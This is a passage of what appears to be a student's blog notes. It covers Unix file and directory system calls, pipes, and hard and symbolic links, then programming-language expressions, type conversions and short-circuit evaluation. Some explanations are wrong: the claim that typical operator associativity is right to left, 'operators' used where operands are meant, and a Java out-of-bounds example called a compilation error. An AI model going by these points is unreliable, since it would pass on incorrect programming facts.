<li><code>fd[0]</code>: the read end</li>
<li><code>fd[1]</code>: the write end</li>
</ul>
</li>
<li><p>Return:</p>
<ul>
<li>Success: return <code>0</code></li>
<li>Error: return <code>-1</code></li>
</ul>
</li>
<li><p>Example:</p>
<ul>
<li>counting the lines of output in executing <code>ls -l</code>  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 7-pipe */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">main()&#123;</span><br><span class="line">    <span class="type">int</span> fd[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    <span class="type">char</span> *cmd;</span><br><span class="line">    <span class="type">char</span> *argv[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    pipe(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((ret=fork()) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            Parent Process</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">            We want to use parent process executes &quot;ls -l&quot;, so do redirection</span></span><br><span class="line"><span class="comment">            We want to redirect the standard output to the write end of pipe</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        close(<span class="number">1</span>);		<span class="comment">// close standard output</span></span><br><span class="line">        dup(fd[<span class="number">1</span>]);		<span class="comment">// fd[1] is duplicated to standard output</span></span><br><span class="line">        close(fd[<span class="number">0</span>]);</span><br><span class="line">        close(fd[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        cmd = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">        argv[<span class="number">0</span>] = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">        argv[<span class="number">1</span>] = <span class="string">&quot;-l&quot;</span>;</span><br><span class="line">        argv[<span class="number">2</span>] = <span class="literal">NULL</span>;</span><br><span class="line">        execvp(cmd, argv);</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(ret == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            Child Process</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">            We want to use child process executes &quot;wc -l&quot;, so do redirection</span></span><br><span class="line"><span class="comment">            We want to redirect the standard input to the read end of pipe</span></span><br><span class="line"><span class="comment">                to get the input from the parent process</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        close(<span class="number">0</span>);		<span class="comment">// close standard input</span></span><br><span class="line">        dup(fd[<span class="number">0</span>]);		<span class="comment">// fd[0] is duplicated to standard input</span></span><br><span class="line">        close(fd[<span class="number">0</span>]);</span><br><span class="line">        close(fd[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        cmd = <span class="string">&quot;wc&quot;</span>;</span><br><span class="line">        argv[<span class="number">0</span>] = <span class="string">&quot;wc&quot;</span>;</span><br><span class="line">        argv[<span class="number">1</span>] = <span class="string">&quot;-l&quot;</span>;</span><br><span class="line">        argv[<span class="number">2</span>] = <span class="literal">NULL</span>;</span><br><span class="line">        execvp(cmd, argv);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="Other-Operations"><a href="#Other-Operations" class="headerlink" title="Other Operations"></a>Other Operations</h2><h3 id="fsync-Write-Immdeiately"><a href="#fsync-Write-Immdeiately" class="headerlink" title="fsync Write Immdeiately"></a><code>fsync</code> Write Immdeiately</h3><ul>
<li><p>Description:</p>
<ul>
<li>The file system will buffer writes in memorys for some time, so the write(s) will actually be issued to the storage device, like data lost.</li>
<li><code>fsync</code> system call forces all dirty data written to disk immediately, and returns after all these writes were completed.</li>
</ul>
</li>
<li><p>Syntax: <code>int fsync(int fd)</code></p>
</li>
<li><p>Return:</p>
<ul>
<li>Success: return <code>0</code></li>
<li>Error: return <code>-1</code></li>
</ul>
</li>
</ul>
<h3 id="rename-Rename-File"><a href="#rename-Rename-File" class="headerlink" title="rename Rename File"></a><code>rename</code> Rename File</h3><ul>
<li><p>Syntax: <code>rename(char* old, char* new)</code></p>
</li>
<li><p>Example:</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> fd = open(<span class="string">&quot;foo.txt.tmp&quot;</span>, O_WRONLY | O_CREAT | O_TRUNC, S_IRWXU);</span><br><span class="line"><span class="type">char</span> buffer[<span class="number">20</span>] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">write(fd, buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">fsync(fd);</span><br><span class="line">close(fd);</span><br><span class="line">rename(<span class="string">&quot;foo.txt.tmp&quot;</span>, <span class="string">&quot;foo.txt&quot;</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="fstat-Show-Information"><a href="#fstat-Show-Information" class="headerlink" title="fstat Show Information"></a><code>fstat</code> Show Information</h3><ul>
<li><p>Show the file metadata (the information about the file).</p>
</li>
<li><p>Structure:</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> &#123;</span></span><br><span class="line">    <span class="type">dev_t</span> st_dev; 	<span class="comment">/* ID of device containing file */</span></span><br><span class="line">    <span class="type">ino_t</span> st_ino; 	<span class="comment">/* inode number */</span></span><br><span class="line">    <span class="type">mode_t</span> st_mode; 	<span class="comment">/* protection */</span></span><br><span class="line">    <span class="type">nlink_t</span> st_nlink; 	<span class="comment">/* number of hard links */</span></span><br><span class="line">    <span class="type">uid_t</span> st_uid; 	<span class="comment">/* user ID of owner */</span></span><br><span class="line">    <span class="type">gid_t</span> st_gid; 	<span class="comment">/* group ID of owner */</span></span><br><span class="line">    <span class="type">dev_t</span> st_rdev; 	<span class="comment">/* device ID (if special file) */</span></span><br><span class="line">    <span class="type">off_t</span> st_size; 	<span class="comment">/* total size, in bytes */</span></span><br><span class="line">    <span class="type">blksize_t</span> st_blksize; <span class="comment">/* blocksize for filesystem I/O */</span></span><br><span class="line">    <span class="type">blkcnt_t</span> st_blocks; 	<span class="comment">/* number of blocks allocated */</span></span><br><span class="line">    <span class="type">time_t</span> st_atime; 	<span class="comment">/* time of last access */</span></span><br><span class="line">    <span class="type">time_t</span> st_mtime; 	<span class="comment">/* time of last modification */</span></span><br><span class="line">    <span class="type">time_t</span> st_ctime; 	<span class="comment">/* time of last status change */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

</li>
<li><p>Example:</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> hello &gt; file   <span class="comment"># create and write &quot;hello&quot; into file</span></span><br><span class="line"><span class="built_in">stat</span> file   <span class="comment"># show the information of file</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="Directories-Operations"><a href="#Directories-Operations" class="headerlink" title="Directories Operations"></a>Directories Operations</h2><ol>
<li><p>Create Directories</p>
<ul>
<li><code>mkdir</code> system call</li>
<li>Make an empty directory, which contains two entries: <code>.</code>(itself) and <code>..</code>(parent).</li>
</ul>
</li>
<li><p>Read Directories</p>
<ul>
<li><code>opendir</code> system call: open directory</li>
<li><code>readdir</code> system call: read directory entries (similar to <code>ls</code>).</li>
</ul>
</li>
<li><p>Remove Directories</p>
<ul>
<li><code>rmdir</code> system call</li>
<li><font color="f54747">It requires the directory is empty</font>.</li>
</ul>
</li>
</ol>
<ul>
<li>Example:  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dirent.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span>&#123;</span><br><span class="line">    DIR *dp = opendir(<span class="string">&quot;.&quot;</span>);             <span class="comment">// open current directory</span></span><br><span class="line">    assert(dp != <span class="literal">NULL</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> *<span class="title">d</span>;</span></span><br><span class="line">    <span class="keyword">while</span> ((d = readdir(dp)) != <span class="literal">NULL</span>)   <span class="comment">// read one directory entry </span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// print outthe name and inode number of each file</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d %s\n&quot;</span>, (<span class="type">int</span>) d-&gt;d_ino, d-&gt;d_name);</span><br><span class="line">    &#125;</span><br><span class="line">    closedir(dp);                       <span class="comment">// close current directory</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="Links"><a href="#Links" class="headerlink" title="Links"></a>Links</h2><h3 id="Hard-Links"><a href="#Hard-Links" class="headerlink" title="Hard Links"></a>Hard Links</h3><ul>
<li><p>Description:</p>
<ul>
<li><p>Creare another name in the directory and refer it to the <font color="f54747">same inode number (same file)</font> of the original file.</p>
</li>
<li><p>Noted: <font color="f54747">Hard link does not really create a file, it just creates a link which linking to the original file</font>.</p>
</li>
<li><p>Editting the old file would change the content in new file.</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> hello &gt; file</span><br><span class="line"><span class="built_in">ln</span> file file2       <span class="comment"># create a hard link, link file to file2</span></span><br><span class="line"><span class="built_in">echo</span> helloworld &gt; file</span><br><span class="line"><span class="built_in">cat</span> file2           <span class="comment"># helloworld</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">ls</span> -i file file2</span><br><span class="line">4633749 file	4633749 file2   <span class="comment"># they have the same inode value</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Syntax: </p>
<ul>
<li>system call: <code>link(char* &quot;oldpath&quot;, char* &quot;newpath&quot;);</code></li>
<li>command: <code>ln oldpath newpath</code></li>
</ul>
</li>
<li><p>Remove File:</p>
<ul>
<li>That’s why we call <code>unlink</code> to remove file.  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> hello &gt; file</span><br><span class="line"><span class="built_in">ln</span> file file2       <span class="comment"># create a hard link, link file2 to file</span></span><br><span class="line"><span class="built_in">rm</span> file             <span class="comment"># remove file</span></span><br><span class="line"><span class="built_in">cat</span> file2           <span class="comment"># file2 can still access the file</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h3 id="Symbolic-Links-Soft-Link"><a href="#Symbolic-Links-Soft-Link" class="headerlink" title="Symbolic Links (Soft Link)"></a>Symbolic Links (Soft Link)</h3><ul>
<li><p>Description:</p>
<ul>
<li>It can create for a directory (hard link cannot).  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> foo</span><br><span class="line"><span class="built_in">ln</span> foo foo1     <span class="comment"># ln: foo: Is a directory</span></span><br><span class="line"><span class="built_in">ln</span> -s foo foo1</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Difference:</p>
<ol>
<li>File system knows that symbolic link is a <font color="f54747">third type</font> (different type), so <font color="f54747">symbolic link does just create a new file</font>.</li>
<li>The size of symbolic link is <font color="f54747">4 bytes</font> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -a</span><br><span class="line"><span class="comment"># -rw-r--r--   ...   6   file</span></span><br><span class="line"><span class="comment"># lrwxr-xr-x   ...   4   file2 -&gt; file</span></span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>Remove File:</p>
<ul>
<li>When the original file was removed, symbolic link points nothing  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> hello &gt; file</span><br><span class="line"><span class="built_in">ln</span> -s file file2</span><br><span class="line"><span class="built_in">rm</span> file</span><br><span class="line"><span class="built_in">cat</span> file2           <span class="comment"># cat: file2: No such file or directory</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>CSCI3150</category>
      </categories>
  </entry>
  <entry>
    <title>CSCI3180 - Expressions and Assignment Statements</title>
    <url>/myBlog/2023/03/13/2023/CSCI3180/2023-3-13-CSCI3180-Expressions-Assignment-Statements/</url>
    <content><![CDATA[<h2 id="Arithmetic-Expressions"><a href="#Arithmetic-Expressions" class="headerlink" title="Arithmetic Expressions"></a>Arithmetic Expressions</h2><ul>
<li>consist of <font color="3A75EA">operators</font>, <font color="3A75EA">operands</font> and <font color="3A75EA">parentheses</font></li>
</ul>
<h3 id="Operators"><a href="#Operators" class="headerlink" title="Operators"></a>Operators</h3><ul>
<li>can be <font color="3A75EA">infix</font>, <font color="3A75EA">prefix</font>, or <font color="3A75EA">postfix</font> (most of them are infix)<ol>
<li><p><strong>Unary Operator</strong>: has one operator</p>
<ul>
<li><code>i++</code>, <code>--i</code></li>
</ul>
</li>
<li><p><strong>Binary Operator</strong>: has two operators</p>
<ul>
<li><code>a + b</code></li>
</ul>
</li>
<li><p><strong>Ternary Operator</strong>: has three operators</p>
<ul>
<li><code>a ? b : c</code></li>
</ul>
</li>
</ol>
</li>
</ul>
<h4 id="Operator-Precedence-Rules"><a href="#Operator-Precedence-Rules" class="headerlink" title="Operator Precedence Rules"></a>Operator Precedence Rules</h4><ul>
<li>determines the order in which operators are evaluated in an expression</li>
<li>Typical precedence levels:<ol>
<li>Parentheses <code>()</code></li>
<li>Exponentiation <code>**</code> or <code>^</code></li>
<li>Multiplication <code>*</code>, <code>/</code></li>
<li>Addition &amp; Subtraction <code>+</code> &amp; <code>-</code></li>
</ol>
</li>
</ul>
<h4 id="Operator-Associativity-Rule"><a href="#Operator-Associativity-Rule" class="headerlink" title="Operator Associativity Rule"></a>Operator Associativity Rule</h4><ul>
<li>refers to the order in which operators with the <strong>same precedence</strong> are evaluated in an expression</li>
<li>Typical associativity rules:<ul>
<li><font color="F54747">right to left</font> (except exponentiation <code>**</code>)  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">2</span> ** <span class="number">2</span> ** <span class="number">3</span> <span class="comment"># 256</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><font color="F54747"><strong>Remind:</strong></font> APL is different: all operators have <font color="3A75EA">equal precedence</font> and all operators <font color="3A75EA">associate right to left</font>  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2 * 5 + 7   ⍝ 24</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Operand"><a href="#Operand" class="headerlink" title="Operand"></a>Operand</h3><ol>
<li>Variable</li>
<li>Constant</li>
<li>Parenthesized expression</li>
<li>Function call</li>
</ol>
<h4 id="Side-Effecr"><a href="#Side-Effecr" class="headerlink" title="Side Effecr"></a>Side Effecr</h4><ul>
<li><p>it occurs when a function changes a two-way parameter, a non-local variable, or a static-storage variable</p>
<ol>
<li><p>updated a non-local variable</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">fun</span><span class="params">(<span class="type">int</span>&amp; x)</span></span>&#123;</span><br><span class="line">    x += <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> x * <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">0</span>;</span><br><span class="line">    cout &lt;&lt; a + <span class="built_in">fun</span>(a) &lt;&lt; endl; <span class="comment">// 3 (expected: 2)</span></span><br><span class="line">    <span class="type">int</span> b = <span class="number">0</span>;</span><br><span class="line">    cout &lt;&lt; b + <span class="number">1</span> + <span class="built_in">fun</span>(b) &lt;&lt; endl; <span class="comment">// 3 (the expect value is not previous + 1)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>updated a static-storage variable</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> g = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">fun</span><span class="params">(<span class="type">int</span> b)</span></span>&#123;</span><br><span class="line">    g += <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span> * b * g;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">fun</span>(<span class="number">2</span>) &lt;&lt; endl; <span class="comment">// 8</span></span><br><span class="line">    cout &lt;&lt; <span class="built_in">fun</span>(<span class="number">2</span>) &lt;&lt; endl; <span class="comment">// 12 (the expect value is not same as previous)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p><strong>Solutions</strong></p>
<ol>
<li>disallow functional side effects<ul>
<li>No two-way parameters in functions</li>
<li>No static-storage &#x2F; non-local assignable variable access in function</li>
<li><strong>Disadvantages</strong>: Inflexibility</li>
</ul>
</li>
</ol>
</li>
</ul>
<h3 id="Referential-Transparency"><a href="#Referential-Transparency" class="headerlink" title="Referential Transparency"></a>Referential Transparency</h3><ul>
<li><p>if it always produces the same result for a given set of input parameters, and its result does not depend on any external state or side effects.</p>
<ul>
<li>the function is referential transparency if <code>result1</code> and <code>result2</code> are equivalent  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">result1 = (<span class="built_in">fun</span>(a) + b) / (<span class="built_in">fun</span>(a) - c)</span><br><span class="line">temp = <span class="built_in">fun</span>(a)</span><br><span class="line">result2 = (temp + b) / (temp - c)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>Advantages</strong></p>
<ul>
<li>much easier to understand as they do not have variables</li>
</ul>
</li>
</ul>
<h2 id="Overloaded-Operators"><a href="#Overloaded-Operators" class="headerlink" title="Overloaded Operators"></a>Overloaded Operators</h2><ul>
<li><p>an operator can work for more than one data type or class</p>
<ul>
<li><code>1 + 2</code>: work for int</li>
<li><code>1.1 + 2.2</code>: also work for float</li>
<li><code>&amp;a</code>: getting the address of a</li>
<li><code>a&amp;b</code>: logic and operation</li>
</ul>
</li>
<li><p><code>C++</code>, <code>C#</code>, and <code>F#</code> allow user-defined overloaded operators</p>
<ul>
<li><p>When sensibly used, such operators can be an aid to readability</p>
</li>
<li><p><strong>Potential problems</strong>:</p>
<ol>
<li>users can define nonsense operations</li>
<li>readability may suffer, even when the operators make sense</li>
</ol>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> std::cout;</span><br><span class="line"><span class="keyword">using</span> std::endl;</span><br><span class="line"><span class="keyword">using</span> std::ostream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Vector</span>&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Vector</span>(<span class="type">float</span> x, <span class="type">float</span> y, <span class="type">float</span> z) : <span class="built_in">x</span>(x), <span class="built_in">y</span>(y), <span class="built_in">z</span>(z) &#123; &#125;</span><br><span class="line">    Vector <span class="keyword">operator</span>+(<span class="type">const</span> Vector&amp; another)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Vector</span>(x+another.x, y+another.y, z+another.z);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">float</span> <span class="title">getX</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> x; &#125;</span><br><span class="line">    <span class="function"><span class="type">float</span> <span class="title">getY</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> y; &#125;</span><br><span class="line">    <span class="function"><span class="type">float</span> <span class="title">getZ</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> z; &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">float</span> x, y, z;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">ostream&amp; <span class="keyword">operator</span>&lt;&lt;(ostream&amp; os, Vector v)&#123;</span><br><span class="line">    os &lt;&lt; <span class="string">&quot;(&quot;</span> &lt;&lt; v.<span class="built_in">getX</span>() &lt;&lt; <span class="string">&quot;,&quot;</span> &lt;&lt; v.<span class="built_in">getY</span>() &lt;&lt; <span class="string">&quot;,&quot;</span> &lt;&lt; v.<span class="built_in">getZ</span>() &lt;&lt; <span class="string">&quot;)&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> os;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="function">Vector <span class="title">a</span><span class="params">(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span>, <span class="title">b</span><span class="params">(<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>)</span></span>;</span><br><span class="line">    Vector c = a + b;</span><br><span class="line">    cout &lt;&lt; a &lt;&lt; <span class="string">&quot; + &quot;</span> &lt;&lt; b &lt;&lt; <span class="string">&quot; = &quot;</span> &lt;&lt; c &lt;&lt; endl; <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="Type-Conversions"><a href="#Type-Conversions" class="headerlink" title="Type Conversions"></a>Type Conversions</h2><ol>
<li><p><font color="3A75EA"><strong>narrowing conversion</strong></font> (Not allow in <code>Java</code>)</p>
<ul>
<li>the converted object cannot include all of the values of the original type by the programming language</li>
<li><code>float</code> to <code>int</code></li>
</ul>
</li>
<li><p><font color="3A75EA"><strong>widening conversion</strong></font></p>
<ul>
<li>the converted object can include <em>at least approximations</em> to all of the values of the original type</li>
<li><code>int</code> to <code>float</code></li>
</ul>
</li>
</ol>
<h3 id="Implicit-Type-Conversions"><a href="#Implicit-Type-Conversions" class="headerlink" title="Implicit Type Conversions"></a>Implicit Type Conversions</h3><ul>
<li>automatic conversion of a value from one data type to another  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">42</span></span><br><span class="line">b = <span class="number">3.14</span></span><br><span class="line">c = a + b</span><br><span class="line"><span class="built_in">print</span>(c)   <span class="comment"># 45.14 (a is automatically converted to float)</span></span><br></pre></td></tr></table></figure></li>
<li><strong>Advantage</strong>: convenience</li>
<li><strong>Disadvantage</strong>: reliability (lower the error detection ability of the compiler)</li>
</ul>
<h3 id="Explicit-Type-Conversions"><a href="#Explicit-Type-Conversions" class="headerlink" title="Explicit Type Conversions"></a>Explicit Type Conversions</h3><ul>
<li>manual conversion of a value from one data type to another by the programmer</li>
<li><code>int(variable)</code> or <code>(int)variable</code>: depend on language  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&quot;42&quot;</span></span><br><span class="line">b = <span class="built_in">float</span>(a)</span><br><span class="line"><span class="built_in">print</span>(b) <span class="comment"># 42.0</span></span><br></pre></td></tr></table></figure>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">double</span> <span class="variable">c</span> <span class="operator">=</span> <span class="number">3.14</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">d</span> <span class="operator">=</span> (<span class="type">int</span>) c;</span><br><span class="line">System.out.println(d); <span class="comment">// 3</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="Relational-and-Boolean-Expressions"><a href="#Relational-and-Boolean-Expressions" class="headerlink" title="Relational and Boolean Expressions"></a>Relational and Boolean Expressions</h2><h3 id="Relational-Expressions"><a href="#Relational-Expressions" class="headerlink" title="Relational Expressions"></a>Relational Expressions</h3><ul>
<li>the comparation of two operands with one relational operator and evaluate to <code>Boolean</code></li>
<li>some operator symbols which vary among languages (<code>!=</code>, <code>ne</code>, <code>&lt;&gt;</code>) </li>
<li><code>JavaScript</code> and <code>PHP</code> have two additional relational operator <code>===</code> and <code>!==</code>  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> == <span class="number">1.0</span>    <span class="comment">// true</span></span><br><span class="line"><span class="number">1</span> == <span class="string">&#x27;1&#x27;</span>    <span class="comment">// true</span></span><br><span class="line"><span class="number">1</span> == <span class="literal">true</span>   <span class="comment">// true</span></span><br><span class="line"><span class="number">1</span> === <span class="number">1.0</span>   <span class="comment">// true (javascript only has number type)</span></span><br><span class="line"><span class="number">1</span> === <span class="string">&#x27;1&#x27;</span>   <span class="comment">// false</span></span><br><span class="line"><span class="number">1</span> === <span class="literal">true</span>  <span class="comment">// false</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Boolean-Expressions"><a href="#Boolean-Expressions" class="headerlink" title="Boolean Expressions"></a>Boolean Expressions</h3><ul>
<li><p>The operands and the result are all <code>Boolean</code></p>
<ul>
<li><code>C</code>, <code>C++</code>, <code>Java</code>: <code>&amp;&amp;</code>, <code>||</code></li>
<li><code>Python</code>: <code>and</code>, <code>or</code></li>
</ul>
</li>
<li><p>Traditional C: Boolean <code>true</code> value is <code>1</code> whereas Boolean <code>false</code> value is <code>0</code></p>
</li>
<li><p>Chain comparison:</p>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> re = <span class="number">3</span> &gt; <span class="number">2</span> &gt; <span class="number">1</span>;    <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">re = <span class="number">3</span> &gt; <span class="number">2</span> &gt; <span class="number">1</span>     <span class="comment"># True</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="Short-Circuit-Evaluation"><a href="#Short-Circuit-Evaluation" class="headerlink" title="Short-Circuit Evaluation"></a>Short-Circuit Evaluation</h2><ul>
<li><p>an expression in which the result is determined <font color="3A75EA">without evaluating all of the operands and&#x2F;or operators</font></p>
<ul>
<li><code>(87 * a) * (b / 17 - 9)</code>: if <code>a</code> is <code>0</code>, then no need to evaluate <code>(b / 17 - 9)</code></li>
<li><code>A &amp;&amp; B</code>: if <code>A</code> is <code>false</code>, then no need to evaluate <code>B</code></li>
<li><code>A || B</code>: if <code>A</code> is <code>true</code>, then no need to evaluate <code>B</code></li>
</ul>
</li>
<li><p>bitwise Boolean operators that are <font color="F54747">not short-circuit</font>: <code>&amp;</code> and <code>|</code></p>
</li>
<li><p><strong>Advantages</strong>: efficiency (save the compilation power)</p>
</li>
<li><p><strong>Condition</strong>: program correctness</p>
<ul>
<li>if we use the <code>&amp;</code> operator that doest not has short-circult  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">    <span class="type">int</span>[] a = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line">    <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(index &lt; a.length &amp; a[index] != <span class="number">1337</span>)&#123;</span><br><span class="line">        index++;</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>it is <font color="F54747">compilation error</font>, because when <code>index</code> is 4, <code>a[index]</code> does not exist</li>
</ul>
</li>
<li><p><font color="F54747"><strong>Potential error</strong></font>: <code>(a &gt; b) || (b++ / 5)</code> if <code>(a &gt; b)</code> is <code>true</code>, <code>b++</code> does not be executed</p>
</li>
</ul>
<h2 id="Assignment-Statements"><a href="#Assignment-Statements" class="headerlink" title="Assignment Statements"></a>Assignment Statements</h2><ul>
<li><p>General Syntax: <code>&lt;target_variable&gt; &lt;assignment_operator&gt; &lt;expression&gt;</code></p>
</li>
<li><p>Assignment Operators</p>
<ul>
<li>Most of languages: <code>=</code></li>
<li>Pascal and Ada: <code>:=</code></li>
</ul>
</li>
<li><p><strong>Conditional Targets</strong></p>
